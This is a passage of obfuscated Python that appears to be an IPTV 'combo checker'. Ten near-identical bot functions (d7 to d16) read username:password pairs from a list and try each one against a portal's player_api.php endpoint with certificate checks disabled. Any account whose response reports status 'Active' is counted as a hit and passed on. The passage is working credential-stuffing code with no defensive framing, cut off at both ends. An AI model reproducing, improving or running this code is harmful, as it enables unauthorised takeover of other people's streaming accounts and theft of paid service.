			 OOOOO00OOO0000O0O =totLen [OO0O00OOOO0OO0OOO ].split (":")#line:558
			 try :#line:559
			 	O000O0OO00OOOOO00 =str (OOOOO00OOO0000O0O [0 ].replace (" ",""))#line:560
			 except :#line:561
			 	OOO0OOOO00O0000OO ='feyzo'#line:562
			 try :#line:563
			 	O000OO00O00O0O0O0 =str (OOOOO00OOO0000O0O [1 ].replace (" ",""))#line:564
			 	O000OO00O00O0O0O0 =str (O000OO00O00O0O0O0 .replace ('\n',""))#line:565
			 except :#line:566
			 	O000OO00O00O0O0O0 ='feyzo'#line:567
			 O0000OOOOO0OOO0OO =int (O0000OOOOO0OOO0OO )+1 #line:568
			 OO0000000OO0O00OO ='Bot_06'#line:569
			 OOO0O00O00OO000O0 =""#line:570
			 OOO0O00O00OO000O0 =round (((OO0O00OOOO0OO0OOO )/(uz )*100 ),2 )#line:571
			 echox (O000O0OO00OOOOO00 ,O000OO00O00O0O0O0 ,OO0000000OO0O00OO ,OO0O00OOOO0OO0OOO ,OOO0O00O00OO000O0 ,hit )#line:572
			 O00OOOOO0000O00O0 ="http://"+portal +"/player_api.php?username="+O000O0OO00OOOOO00 +"&password="+O000OO00O00O0O0O0 +"&type=m3u"#line:575
			 OOO000O0OO0OOO0O0 =0 #line:576
			 O0OOOO00OO0OO00OO =""#line:577
			 while True :#line:578
			 	try :#line:579
			 		O0OO0OO0000O0O00O =ses .get (O00OOOOO0000O00O0 ,headers =HEADERd ,timeout =15 ,verify =False )#line:580
			 		break #line:581
			 	except :#line:582
			 		time .sleep (4 )#line:584
			 O0OOOO00OO0OO00OO =str (O0OO0OO0000O0O00O .text )#line:587
			 if 'username'in O0OOOO00OO0OO00OO :#line:588
			     O0OO000OOO0O000OO =O0OOOO00OO0OO00OO .split ('status":')[1 ]#line:590
			     O0OO000OOO0O000OO =O0OO000OOO0O000OO .split (',')[0 ]#line:591
			     O0OO000OOO0O000OO =O0OO000OOO0O000OO .replace ('"',"")#line:592
			     if O0OO000OOO0O000OO =='Active':#line:593
			     	print ('🌟 🌟 🇭 🇮 🇹🌟 🌟 ')#line:594
			     	hit =hit +1 #line:595
			     	onay (O0OOOO00OO0OO00OO ,O000O0OO00OOOOO00 ,O000OO00O00O0O0O0 )#line:596
def d7 ():#line:600
	global hit #line:601
	O0OO0O00O0O00OOO0 =0 #line:602
	for O00OOOOO0O00O00OO in range (7 ,uz ,botsay ):#line:603
		O0O0OOO0O00OOOO0O =re .search (pattern ,totLen [O00OOOOO0O00O00OO ],re .IGNORECASE )#line:604
		if O0O0OOO0O00OOOO0O :#line:605
			 OOOOOO0000OO0OO00 =totLen [O00OOOOO0O00O00OO ].split (":")#line:606
			 try :#line:607
			 	O0O0OO000O00O00OO =str (OOOOOO0000OO0OO00 [0 ].replace (" ",""))#line:608
			 except :#line:609
			 	O0OO00O0OO00O0000 ='feyzo'#line:610
			 try :#line:611
			 	OO0OO000O0OO0O00O =str (OOOOOO0000OO0OO00 [1 ].replace (" ",""))#line:612
			 	OO0OO000O0OO0O00O =str (OO0OO000O0OO0O00O .replace ('\n',""))#line:613
			 except :#line:614
			 	OO0OO000O0OO0O00O ='feyzo'#line:615
			 O0OO0O00O0O00OOO0 =int (O0OO0O00O0O00OOO0 )+1 #line:616
			 O00000O0OO0O0OOOO ='Bot_07'#line:617
			 O00O00000O0OOO0OO =""#line:618
			 O00O00000O0OOO0OO =round (((O00OOOOO0O00O00OO )/(uz )*100 ),2 )#line:619
			 echox (O0O0OO000O00O00OO ,OO0OO000O0OO0O00O ,O00000O0OO0O0OOOO ,O00OOOOO0O00O00OO ,O00O00000O0OOO0OO ,hit )#line:620
			 OOOOO0O0O0O0O0OOO ="http://"+portal +"/player_api.php?username="+O0O0OO000O00O00OO +"&password="+OO0OO000O0OO0O00O +"&type=m3u"#line:623
			 O00OOO00OOO0O00OO =0 #line:624
			 O00OOOO000O000OOO =""#line:625
			 while True :#line:626
			 	try :#line:627
			 		O0000000OOO0O00OO =ses .get (OOOOO0O0O0O0O0OOO ,headers =HEADERd ,timeout =15 ,verify =False )#line:628
			 		break #line:629
			 	except :#line:630
			 		time .sleep (4 )#line:632
			 O00OOOO000O000OOO =str (O0000000OOO0O00OO .text )#line:635
			 if 'username'in O00OOOO000O000OOO :#line:636
			     O0OO0O00O00O0OOO0 =O00OOOO000O000OOO .split ('status":')[1 ]#line:638
			     O0OO0O00O00O0OOO0 =O0OO0O00O00O0OOO0 .split (',')[0 ]#line:639
			     O0OO0O00O00O0OOO0 =O0OO0O00O00O0OOO0 .replace ('"',"")#line:640
			     if O0OO0O00O00O0OOO0 =='Active':#line:641
			     	print ('🌟 🌟 🇭 🇮 🇹🌟 🌟 ')#line:642
			     	hit =hit +1 #line:643
			     	onay (O00OOOO000O000OOO ,O0O0OO000O00O00OO ,OO0OO000O0OO0O00O )#line:644
def d8 ():#line:648
	global hit #line:649
	OO0O000000O00OO00 =0 #line:650
	for O0OOO0O0OO000OO00 in range (8 ,uz ,botsay ):#line:651
		OOO000O00O00OO00O =re .search (pattern ,totLen [O0OOO0O0OO000OO00 ],re .IGNORECASE )#line:652
		if OOO000O00O00OO00O :#line:653
			 O00O0O00O0OOOO000 =totLen [O0OOO0O0OO000OO00 ].split (":")#line:654
			 try :#line:655
			 	OOO00OOOOOO0OOO0O =str (O00O0O00O0OOOO000 [0 ].replace (" ",""))#line:656
			 except :#line:657
			 	OO000O00O0O0OO000 ='feyzo'#line:658
			 try :#line:659
			 	O00O0000OO0OO0O0O =str (O00O0O00O0OOOO000 [1 ].replace (" ",""))#line:660
			 	O00O0000OO0OO0O0O =str (O00O0000OO0OO0O0O .replace ('\n',""))#line:661
			 except :#line:662
			 	O00O0000OO0OO0O0O ='feyzo'#line:663
			 OO0O000000O00OO00 =int (OO0O000000O00OO00 )+1 #line:664
			 O0OOOO0O000O0O0OO ='Bot_08'#line:665
			 O0O00OO0O00O000OO =""#line:666
			 O0O00OO0O00O000OO =round (((O0OOO0O0OO000OO00 )/(uz )*100 ),2 )#line:667
			 echox (OOO00OOOOOO0OOO0O ,O00O0000OO0OO0O0O ,O0OOOO0O000O0O0OO ,O0OOO0O0OO000OO00 ,O0O00OO0O00O000OO ,hit )#line:668
			 OO00OO0OO0000O00O ="http://"+portal +"/player_api.php?username="+OOO00OOOOOO0OOO0O +"&password="+O00O0000OO0OO0O0O +"&type=m3u"#line:671
			 O0000OOOOOO0OOOO0 =0 #line:672
			 O0OO0O00O00000000 =""#line:673
			 while True :#line:674
			 	try :#line:675
			 		O0OO0OOOO0OOO0O00 =ses .get (OO00OO0OO0000O00O ,headers =HEADERd ,timeout =15 ,verify =False )#line:676
			 		break #line:677
			 	except :#line:678
			 		time .sleep (4 )#line:680
			 O0OO0O00O00000000 =str (O0OO0OOOO0OOO0O00 .text )#line:683
			 if 'username'in O0OO0O00O00000000 :#line:684
			     OO00OOO0O0OOO0OO0 =O0OO0O00O00000000 .split ('status":')[1 ]#line:686
			     OO00OOO0O0OOO0OO0 =OO00OOO0O0OOO0OO0 .split (',')[0 ]#line:687
			     OO00OOO0O0OOO0OO0 =OO00OOO0O0OOO0OO0 .replace ('"',"")#line:688
			     if OO00OOO0O0OOO0OO0 =='Active':#line:689
			     	print ('🌟 🌟 🇭 🇮 🇹🌟 🌟 ')#line:690
			     	hit =hit +1 #line:691
			     	onay (O0OO0O00O00000000 ,OOO00OOOOOO0OOO0O ,O00O0000OO0OO0O0O )#line:692
def d9 ():#line:695
	global hit #line:696
	OOOOO0O000O00OO0O =0 #line:697
	for O0000000O00OOOOO0 in range (9 ,uz ,botsay ):#line:698
		OO0OO0O000OOO0O00 =re .search (pattern ,totLen [O0000000O00OOOOO0 ],re .IGNORECASE )#line:699
		if OO0OO0O000OOO0O00 :#line:700
			 O0OOOOO0OO0O0O000 =totLen [O0000000O00OOOOO0 ].split (":")#line:701
			 try :#line:702
			 	O0O0OO0O0O0OOOO0O =str (O0OOOOO0OO0O0O000 [0 ].replace (" ",""))#line:703
			 except :#line:704
			 	OOO0OOOO000OO00O0 ='feyzo'#line:705
			 try :#line:706
			 	O00000OOO000O0OOO =str (O0OOOOO0OO0O0O000 [1 ].replace (" ",""))#line:707
			 	O00000OOO000O0OOO =str (O00000OOO000O0OOO .replace ('\n',""))#line:708
			 except :#line:709
			 	O00000OOO000O0OOO ='feyzo'#line:710
			 OOOOO0O000O00OO0O =int (OOOOO0O000O00OO0O )+1 #line:711
			 OO00OOOO0O0O00O00 ='Bot_09'#line:712
			 O0O00OOOOO0000O0O =""#line:713
			 O0O00OOOOO0000O0O =round (((O0000000O00OOOOO0 )/(uz )*100 ),2 )#line:714
			 echox (O0O0OO0O0O0OOOO0O ,O00000OOO000O0OOO ,OO00OOOO0O0O00O00 ,O0000000O00OOOOO0 ,O0O00OOOOO0000O0O ,hit )#line:715
			 O00000OO00000OOOO ="http://"+portal +"/player_api.php?username="+O0O0OO0O0O0OOOO0O +"&password="+O00000OOO000O0OOO +"&type=m3u"#line:718
			 O0OO000O0O00O0OOO =0 #line:719
			 O0O0OOOOOOOO0000O =""#line:720
			 while True :#line:721
			 	try :#line:722
			 		OO0000O0OOO0O0OO0 =ses .get (O00000OO00000OOOO ,headers =HEADERd ,timeout =15 ,verify =False )#line:723
			 		break #line:724
			 	except :#line:725
			 		O0OO000O0O00O0OOO =O0OO000O0O00O0OOO +1 #line:726
			 		time .sleep (4 )#line:727
			 		if O0OO000O0O00O0OOO ==100 :#line:728
			 		      quit ()#line:729
			 O0O0OOOOOOOO0000O =str (OO0000O0OOO0O0OO0 .text )#line:730
			 if 'username'in O0O0OOOOOOOO0000O :#line:731
			     OO0O0O00O00OOO00O =O0O0OOOOOOOO0000O .split ('status":')[1 ]#line:733
			     OO0O0O00O00OOO00O =OO0O0O00O00OOO00O .split (',')[0 ]#line:734
			     OO0O0O00O00OOO00O =OO0O0O00O00OOO00O .replace ('"',"")#line:735
			     if OO0O0O00O00OOO00O =='Active':#line:736
			     	print ('🌟 🌟 🇭 🇮 🇹🌟 🌟 ')#line:737
			     	hit =hit +1 #line:738
			     	onay (O0O0OOOOOOOO0000O ,O0O0OO0O0O0OOOO0O ,O00000OOO000O0OOO )#line:739
def d10 ():#line:742
	global hit #line:743
	O00O00OOO00OOO000 =0 #line:744
	for O0O000OOO0O0OO0O0 in range (10 ,uz ,botsay ):#line:745
		OO00OOO00O0OO00OO =re .search (pattern ,totLen [O0O000OOO0O0OO0O0 ],re .IGNORECASE )#line:746
		if OO00OOO00O0OO00OO :#line:747
			 O0O00O00O0O0OO0O0 =totLen [O0O000OOO0O0OO0O0 ].split (":")#line:748
			 try :#line:749
			 	O000O0OOOOOO0O000 =str (O0O00O00O0O0OO0O0 [0 ].replace (" ",""))#line:750
			 except :#line:751
			 	OOO0O000000O0000O ='feyzo'#line:752
			 try :#line:753
			 	OOO0OO0O0OO0OOOO0 =str (O0O00O00O0O0OO0O0 [1 ].replace (" ",""))#line:754
			 	OOO0OO0O0OO0OOOO0 =str (OOO0OO0O0OO0OOOO0 .replace ('\n',""))#line:755
			 except :#line:756
			 	OOO0OO0O0OO0OOOO0 ='feyzo'#line:757
			 O00O00OOO00OOO000 =int (O00O00OOO00OOO000 )+1 #line:758
			 O000000OO0O00000O ='Bot_10'#line:759
			 O0OO00O00OOO0000O =""#line:760
			 O0OO00O00OOO0000O =round (((O0O000OOO0O0OO0O0 )/(uz )*100 ),2 )#line:761
			 echox (O000O0OOOOOO0O000 ,OOO0OO0O0OO0OOOO0 ,O000000OO0O00000O ,O0O000OOO0O0OO0O0 ,O0OO00O00OOO0000O ,hit )#line:762
			 OO0OOOOOOOO0OOOO0 ="http://"+portal +"/player_api.php?username="+O000O0OOOOOO0O000 +"&password="+OOO0OO0O0OO0OOOO0 +"&type=m3u"#line:765
			 OOO00O0OO0O00OOOO =0 #line:766
			 O00O0OO0OOO00000O =""#line:767
			 while True :#line:768
			 	try :#line:769
			 		OO0O0O0OO0OOO0OOO =ses .get (OO0OOOOOOOO0OOOO0 ,headers =HEADERd ,timeout =15 ,verify =False )#line:770
			 		break #line:771
			 	except :#line:772
			 		OOO00O0OO0O00OOOO =OOO00O0OO0O00OOOO +1 #line:773
			 		time .sleep (4 )#line:774
			 		if OOO00O0OO0O00OOOO ==100 :#line:775
			 		      quit ()#line:776
			 O00O0OO0OOO00000O =str (OO0O0O0OO0OOO0OOO .text )#line:777
			 if 'username'in O00O0OO0OOO00000O :#line:778
			     OO000O00O00OOO00O =O00O0OO0OOO00000O .split ('status":')[1 ]#line:780
			     OO000O00O00OOO00O =OO000O00O00OOO00O .split (',')[0 ]#line:781
			     OO000O00O00OOO00O =OO000O00O00OOO00O .replace ('"',"")#line:782
			     if OO000O00O00OOO00O =='Active':#line:783
			     	print ('🌟 🌟 🇭 🇮 🇹🌟 🌟 ')#line:784
			     	hit =hit +1 #line:785
			     	onay (O00O0OO0OOO00000O ,O000O0OOOOOO0O000 ,OOO0OO0O0OO0OOOO0 )#line:786
def d11 ():#line:789
	global hit #line:790
	OOOOOOO0O00OOO0O0 =0 #line:791
	for OOOO0O0000O0O00OO in range (11 ,uz ,botsay ):#line:792
		OOO000OOO0OOO0000 =re .search (pattern ,totLen [OOOO0O0000O0O00OO ],re .IGNORECASE )#line:793
		if OOO000OOO0OOO0000 :#line:794
			 O00O00O00OOO0OOO0 =totLen [OOOO0O0000O0O00OO ].split (":")#line:795
			 try :#line:796
			 	OO000O0O00OO0O000 =str (O00O00O00OOO0OOO0 [0 ].replace (" ",""))#line:797
			 except :#line:798
			 	O0OO0OO0OO00O0OO0 ='feyzo'#line:799
			 try :#line:800
			 	OOO0OO0000O00000O =str (O00O00O00OOO0OOO0 [1 ].replace (" ",""))#line:801
			 	OOO0OO0000O00000O =str (OOO0OO0000O00000O .replace ('\n',""))#line:802
			 except :#line:803
			 	OOO0OO0000O00000O ='feyzo'#line:804
			 OOOOOOO0O00OOO0O0 =int (OOOOOOO0O00OOO0O0 )+1 #line:805
			 OOO00O0OOO0O00O0O ='Bot_11'#line:806
			 O0O00O000OOOOO00O =""#line:807
			 O0O00O000OOOOO00O =round (((OOOO0O0000O0O00OO )/(uz )*100 ),2 )#line:808
			 echox (OO000O0O00OO0O000 ,OOO0OO0000O00000O ,OOO00O0OOO0O00O0O ,OOOO0O0000O0O00OO ,O0O00O000OOOOO00O ,hit )#line:809
			 O000OOOO0O0OO00O0 ="http://"+portal +"/player_api.php?username="+OO000O0O00OO0O000 +"&password="+OOO0OO0000O00000O +"&type=m3u"#line:812
			 OOO0O0OO0O0OOO0OO =0 #line:813
			 O0O0OO0OOOOOOO0O0 =""#line:814
			 while True :#line:815
			 	try :#line:816
			 		O0OOOOOOO0O0000OO =ses .get (O000OOOO0O0OO00O0 ,headers =HEADERd ,timeout =15 ,verify =False )#line:817
			 		break #line:818
			 	except :#line:819
			 		OOO0O0OO0O0OOO0OO =OOO0O0OO0O0OOO0OO +1 #line:820
			 		time .sleep (4 )#line:821
			 		if OOO0O0OO0O0OOO0OO ==100 :#line:822
			 		      quit ()#line:823
			 O0O0OO0OOOOOOO0O0 =str (O0OOOOOOO0O0000OO .text )#line:824
			 if 'username'in O0O0OO0OOOOOOO0O0 :#line:825
			     OOOOOO000OOO0000O =O0O0OO0OOOOOOO0O0 .split ('status":')[1 ]#line:827
			     OOOOOO000OOO0000O =OOOOOO000OOO0000O .split (',')[0 ]#line:828
			     OOOOOO000OOO0000O =OOOOOO000OOO0000O .replace ('"',"")#line:829
			     if OOOOOO000OOO0000O =='Active':#line:830
			     	print ('🌟 🌟 🇭 🇮 🇹🌟 🌟 ')#line:831
			     	hit =hit +1 #line:832
			     	onay (O0O0OO0OOOOOOO0O0 ,OO000O0O00OO0O000 ,OOO0OO0000O00000O )#line:833
def d12 ():#line:836
	global hit #line:837
	OOO0O000000OO0OOO =0 #line:838
	for OOOO0OO0OO00O0OO0 in range (12 ,uz ,botsay ):#line:839
		OOOOOOO0OOOOOO0O0 =re .search (pattern ,totLen [OOOO0OO0OO00O0OO0 ],re .IGNORECASE )#line:840
		if OOOOOOO0OOOOOO0O0 :#line:841
			 O0000OOO0O00O00OO =totLen [OOOO0OO0OO00O0OO0 ].split (":")#line:842
			 try :#line:843
			 	O0O0OO0OO0OOO0OO0 =str (O0000OOO0O00O00OO [0 ].replace (" ",""))#line:844
			 except :#line:845
			 	OOO000OO0O00O00OO ='feyzo'#line:846
			 try :#line:847
			 	OOOOO0OO0OOOOOOO0 =str (O0000OOO0O00O00OO [1 ].replace (" ",""))#line:848
			 	OOOOO0OO0OOOOOOO0 =str (OOOOO0OO0OOOOOOO0 .replace ('\n',""))#line:849
			 except :#line:850
			 	OOOOO0OO0OOOOOOO0 ='feyzo'#line:851
			 OOO0O000000OO0OOO =int (OOO0O000000OO0OOO )+1 #line:852
			 O00OOO00O0OO0O000 ='Bot_12'#line:853
			 O00O0000000O00OOO =""#line:854
			 O00O0000000O00OOO =round (((OOOO0OO0OO00O0OO0 )/(uz )*100 ),2 )#line:855
			 echox (O0O0OO0OO0OOO0OO0 ,OOOOO0OO0OOOOOOO0 ,O00OOO00O0OO0O000 ,OOOO0OO0OO00O0OO0 ,O00O0000000O00OOO ,hit )#line:856
			 O00000OO00OO0OOOO ="http://"+portal +"/player_api.php?username="+O0O0OO0OO0OOO0OO0 +"&password="+OOOOO0OO0OOOOOOO0 +"&type=m3u"#line:859
			 O0OO00OO0O0OO0000 =0 #line:860
			 O0000000OO0O00OO0 =""#line:861
			 while True :#line:862
			 	try :#line:863
			 		O0OOO0OOO00O0OOOO =ses .get (O00000OO00OO0OOOO ,headers =HEADERd ,timeout =15 ,verify =False )#line:864
			 		break #line:865
			 	except :#line:866
			 		O0OO00OO0O0OO0000 =O0OO00OO0O0OO0000 +1 #line:867
			 		time .sleep (4 )#line:868
			 		if O0OO00OO0O0OO0000 ==100 :#line:869
			 		      quit ()#line:870
			 O0000000OO0O00OO0 =str (O0OOO0OOO00O0OOOO .text )#line:871
			 if 'username'in O0000000OO0O00OO0 :#line:872
			     OOO0OOOOO0O000O0O =O0000000OO0O00OO0 .split ('status":')[1 ]#line:874
			     OOO0OOOOO0O000O0O =OOO0OOOOO0O000O0O .split (',')[0 ]#line:875
			     OOO0OOOOO0O000O0O =OOO0OOOOO0O000O0O .replace ('"',"")#line:876
			     if OOO0OOOOO0O000O0O =='Active':#line:877
			     	print ('🌟 🌟 🇭 🇮 🇹🌟 🌟 ')#line:878
			     	hit =hit +1 #line:879
			     	onay (O0000000OO0O00OO0 ,O0O0OO0OO0OOO0OO0 ,OOOOO0OO0OOOOOOO0 )#line:880
def d13 ():#line:883
	global hit #line:884
	O0OO00O00OO000O00 =0 #line:885
	for O0OO0OOOO0OOO000O in range (13 ,uz ,botsay ):#line:886
		OO00OOO0O0000O00O =re .search (pattern ,totLen [O0OO0OOOO0OOO000O ],re .IGNORECASE )#line:887
		if OO00OOO0O0000O00O :#line:888
			 OOOOO0O000000OOO0 =totLen [O0OO0OOOO0OOO000O ].split (":")#line:889
			 try :#line:890
			 	OO000OOOOOO0OOO0O =str (OOOOO0O000000OOO0 [0 ].replace (" ",""))#line:891
			 except :#line:892
			 	O00OOOOOO0O0O0OO0 ='feyzo'#line:893
			 try :#line:894
			 	O00O00O00O0OOO00O =str (OOOOO0O000000OOO0 [1 ].replace (" ",""))#line:895
			 	O00O00O00O0OOO00O =str (O00O00O00O0OOO00O .replace ('\n',""))#line:896
			 except :#line:897
			 	O00O00O00O0OOO00O ='feyzo'#line:898
			 O0OO00O00OO000O00 =int (O0OO00O00OO000O00 )+1 #line:899
			 OOOO00OO00O000OO0 ='Bot_13'#line:900
			 O00O0OOOO00O0OOO0 =""#line:901
			 O00O0OOOO00O0OOO0 =round (((O0OO0OOOO0OOO000O )/(uz )*100 ),2 )#line:902
			 echox (OO000OOOOOO0OOO0O ,O00O00O00O0OOO00O ,OOOO00OO00O000OO0 ,O0OO0OOOO0OOO000O ,O00O0OOOO00O0OOO0 ,hit )#line:903
			 O0O0OOOO00O0OOOOO ="http://"+portal +"/player_api.php?username="+OO000OOOOOO0OOO0O +"&password="+O00O00O00O0OOO00O +"&type=m3u"#line:906
			 O0OOO0O0O00OO00O0 =0 #line:907
			 O00OOOOOOOOO000OO =""#line:908
			 while True :#line:909
			 	try :#line:910
			 		O00OOO000O0O0O0OO =ses .get (O0O0OOOO00O0OOOOO ,headers =HEADERd ,timeout =15 ,verify =False )#line:911
			 		break #line:912
			 	except :#line:913
			 		O0OOO0O0O00OO00O0 =O0OOO0O0O00OO00O0 +1 #line:914
			 		time .sleep (4 )#line:915
			 		if O0OOO0O0O00OO00O0 ==100 :#line:916
			 		      quit ()#line:917
			 O00OOOOOOOOO000OO =str (O00OOO000O0O0O0OO .text )#line:918
			 if 'username'in O00OOOOOOOOO000OO :#line:919
			     OO00O0O0O0OO0000O =O00OOOOOOOOO000OO .split ('status":')[1 ]#line:921
			     OO00O0O0O0OO0000O =OO00O0O0O0OO0000O .split (',')[0 ]#line:922
			     OO00O0O0O0OO0000O =OO00O0O0O0OO0000O .replace ('"',"")#line:923
			     if OO00O0O0O0OO0000O =='Active':#line:924
			     	print ('🌟 🌟 🇭 🇮 🇹🌟 🌟 ')#line:925
			     	hit =hit +1 #line:926
			     	onay (O00OOOOOOOOO000OO ,OO000OOOOOO0OOO0O ,O00O00O00O0OOO00O )#line:927
def d14 ():#line:930
	global hit #line:931
	O0000OO0OO0OOO000 =0 #line:932
	for OO00OOO0OOO0OO0OO in range (14 ,uz ,botsay ):#line:933
		OOO0OO00O00O00000 =re .search (pattern ,totLen [OO00OOO0OOO0OO0OO ],re .IGNORECASE )#line:934
		if OOO0OO00O00O00000 :#line:935
			 OOO0OOO00000000O0 =totLen [OO00OOO0OOO0OO0OO ].split (":")#line:936
			 try :#line:937
			 	OO0OO0O0OOO0OOO00 =str (OOO0OOO00000000O0 [0 ].replace (" ",""))#line:938
			 except :#line:939
			 	OO0OOOOO00O0O0OO0 ='feyzo'#line:940
			 try :#line:941
			 	O00OOO000O0000000 =str (OOO0OOO00000000O0 [1 ].replace (" ",""))#line:942
			 	O00OOO000O0000000 =str (O00OOO000O0000000 .replace ('\n',""))#line:943
			 except :#line:944
			 	O00OOO000O0000000 ='feyzo'#line:945
			 O0000OO0OO0OOO000 =int (O0000OO0OO0OOO000 )+1 #line:946
			 O0O00OO00000OO00O ='Bot_14'#line:947
			 OO0O000000O00000O =""#line:948
			 OO0O000000O00000O =round (((OO00OOO0OOO0OO0OO )/(uz )*100 ),2 )#line:949
			 echox (OO0OO0O0OOO0OOO00 ,O00OOO000O0000000 ,O0O00OO00000OO00O ,OO00OOO0OOO0OO0OO ,OO0O000000O00000O ,hit )#line:950
			 O000OO000OO0OO00O ="http://"+portal +"/player_api.php?username="+OO0OO0O0OOO0OOO00 +"&password="+O00OOO000O0000000 +"&type=m3u"#line:953
			 O0O00OOO00O000O00 =0 #line:954
			 OOOOO0O000OO0O000 =""#line:955
			 while True :#line:956
			 	try :#line:957
			 		O000OOOO00OOO0O0O =ses .get (O000OO000OO0OO00O ,headers =HEADERd ,timeout =15 ,verify =False )#line:958
			 		break #line:959
			 	except :#line:960
			 		O0O00OOO00O000O00 =O0O00OOO00O000O00 +1 #line:961
			 		time .sleep (4 )#line:962
			 		if O0O00OOO00O000O00 ==100 :#line:963
			 		      quit ()#line:964
			 OOOOO0O000OO0O000 =str (O000OOOO00OOO0O0O .text )#line:965
			 if 'username'in OOOOO0O000OO0O000 :#line:966
			     O00000OO00O0OOO00 =OOOOO0O000OO0O000 .split ('status":')[1 ]#line:968
			     O00000OO00O0OOO00 =O00000OO00O0OOO00 .split (',')[0 ]#line:969
			     O00000OO00O0OOO00 =O00000OO00O0OOO00 .replace ('"',"")#line:970
			     if O00000OO00O0OOO00 =='Active':#line:971
			     	print ('🌟 🌟 🇭 🇮 🇹🌟 🌟 ')#line:972
			     	hit =hit +1 #line:973
			     	onay (OOOOO0O000OO0O000 ,OO0OO0O0OOO0OOO00 ,O00OOO000O0000000 )#line:974
def d15 ():#line:977
	global hit #line:978
	O00OO00OOO0OOO00O =0 #line:979
	for O00O000O0O000OO00 in range (15 ,uz ,botsay ):#line:980
		O00O0OOO0OO0O000O =re .search (pattern ,totLen [O00O000O0O000OO00 ],re .IGNORECASE )#line:981
		if O00O0OOO0OO0O000O :#line:982
			 OO0OOOOOOO0O000OO =totLen [O00O000O0O000OO00 ].split (":")#line:983
			 try :#line:984
			 	O00O0O0O0O0OOOO00 =str (OO0OOOOOOO0O000OO [0 ].replace (" ",""))#line:985
			 except :#line:986
			 	O0O00O0OO00OOO0OO ='feyzo'#line:987
			 try :#line:988
			 	O0OOO0OO0OOO0OOOO =str (OO0OOOOOOO0O000OO [1 ].replace (" ",""))#line:989
			 	O0OOO0OO0OOO0OOOO =str (O0OOO0OO0OOO0OOOO .replace ('\n',""))#line:990
			 except :#line:991
			 	O0OOO0OO0OOO0OOOO ='feyzo'#line:992
			 O00OO00OOO0OOO00O =int (O00OO00OOO0OOO00O )+1 #line:993
			 O000OO0O0OOOO0O0O ='Bot_15'#line:994
			 O00OOOO0O0O000OO0 =""#line:995
			 O00OOOO0O0O000OO0 =round (((O00O000O0O000OO00 )/(uz )*100 ),2 )#line:996
			 echox (O00O0O0O0O0OOOO00 ,O0OOO0OO0OOO0OOOO ,O000OO0O0OOOO0O0O ,O00O000O0O000OO00 ,O00OOOO0O0O000OO0 ,hit )#line:997
			 O000O00OO0000O0O0 ="http://"+portal +"/player_api.php?username="+O00O0O0O0O0OOOO00 +"&password="+O0OOO0OO0OOO0OOOO +"&type=m3u"#line:1000
			 OOO00OOO000OO000O =0 #line:1001
			 O0O0OOOOO0OOOO0OO =""#line:1002
			 while True :#line:1003
			 	try :#line:1004
			 		O0O00O0OO0O0OOO00 =ses .get (O000O00OO0000O0O0 ,headers =HEADERd ,timeout =15 ,verify =False )#line:1005
			 		break #line:1006
			 	except :#line:1007
			 		OOO00OOO000OO000O =OOO00OOO000OO000O +1 #line:1008
			 		time .sleep (4 )#line:1009
			 		if OOO00OOO000OO000O ==100 :#line:1010
			 		      quit ()#line:1011
			 O0O0OOOOO0OOOO0OO =str (O0O00O0OO0O0OOO00 .text )#line:1012
			 if 'username'in O0O0OOOOO0OOOO0OO :#line:1013
			     O0O00O000OOOO0OO0 =O0O0OOOOO0OOOO0OO .split ('status":')[1 ]#line:1015
			     O0O00O000OOOO0OO0 =O0O00O000OOOO0OO0 .split (',')[0 ]#line:1016
			     O0O00O000OOOO0OO0 =O0O00O000OOOO0OO0 .replace ('"',"")#line:1017
			     if O0O00O000OOOO0OO0 =='Active':#line:1018
			     	print ('🌟 🌟 🇭 🇮 🇹🌟 🌟 ')#line:1019
			     	hit =hit +1 #line:1020
			     	onay (O0O0OOOOO0OOOO0OO ,O00O0O0O0O0OOOO00 ,O0OOO0OO0OOO0OOOO )#line:1021
def d16 ():#line:1024
	global hit #line:1025
	O00000OOO0OOO0000 =0 #line:1026
	for OOO000O0OO00OO000 in range (16 ,uz ,botsay ):#line:1027
		OOOOO000OOOO0OOOO =re .search (pattern ,totLen [OOO000O0OO00OO000 ],re .IGNORECASE )#line:1028
		if OOOOO000OOOO0OOOO :#line:1029
			 O0OOO000OOO000O0O =totLen [OOO000O0OO00OO000 ].split (":")#line:1030
			 try :#line:1031
			 	O0OOOO0000O0O0O00 =str (O0OOO000OOO000O0O [0 ].replace (" ",""))#line:1032
			 except :#line:1033
			 	OOO0O00OO000OO00O ='feyzo'#line:1034
			 try :#line:1035
			 	OO00O0O0O0O0OOO0O =str (O0OOO000OOO000O0O [1 ].replace (" ",""))#line:1036
			 	OO00O0O0O0O0OOO0O =str (OO00O0O0O0O0OOO0O .replace ('\n',""))#line:1037
			 except :#line:1038
			 	OO00O0O0O0O0OOO0O ='feyzo'#line:1039
			 O00000OOO0OOO0000 =int (O00000OOO0OOO0000 )+1 #line:1040
			 O00O0OOOO00OOO00O ='Bot_16'#line:1041
			 OO00OOO0OOO0OOOOO =""#line:1042
			 OO00OOO0OOO0OOOOO =round (((OOO000O0OO00OO000 )/(uz )*100 ),2 )#line:1043
			 echox (O0OOOO0000O0O0O00 ,OO00O0O0O0O0OOO0O ,O00O0OOOO00OOO00O ,OOO000O0OO00OO000 ,OO00OOO0OOO0OOOOO ,hit )#line:1044
			 O0000OO0O0O000O00 ="http://"+portal +"/player_api.php?username="+O0OOOO0000O0O0O00 +"&password="+OO00O0O0O0O0OOO0O +"&type=m3u"#line:1047
			 OOOOO0O00OOO0OOOO =0 #line:1048
			 O0000000OOO0OO0O0 =""#line:1049
			 while True :#line:1050
			 	try :#line:1051
			 		OOO0O0OOOO0O00O00 =ses .get (O0000OO0O0O000O00 ,headers =HEADERd ,timeout =15 ,verify =False )#line:1052
			 		break #line:1053
			 	except :#line:1054
			 		OOOOO0O00OOO0OOOO =OOOOO0O00OOO0OOOO +1 #line:1055
			 		time .sleep (4 )#line:1056
			 		if OOOOO0O00OOO0OOOO ==100 :#line:1057
			 		      quit ()#line:1058
			 O0000000OOO0OO0O0 =str (OOO0O0OOOO0O00O00 .text )#line:1059
			 if 'username'in O0000000OOO0OO0O0 :#line:1060
			     OO000OOO0OOOO000O =O0000000OOO0OO0O0 .split ('status":')[1 ]#line:1062
			     OO000OOO0OOOO000O =OO000OOO0OOOO000O .split (',')[0 ]#line:1063
			     OO000OOO0OOOO000O =OO000OOO0OOOO000O .replace ('"',"")#line:1064
			     if OO000OOO0OOOO000O =='Active':#line:1065
			     	print ('🌟 🌟 🇭 🇮 🇹🌟 🌟 ')#line:1066
			     	hit =hit +1 #line:1067
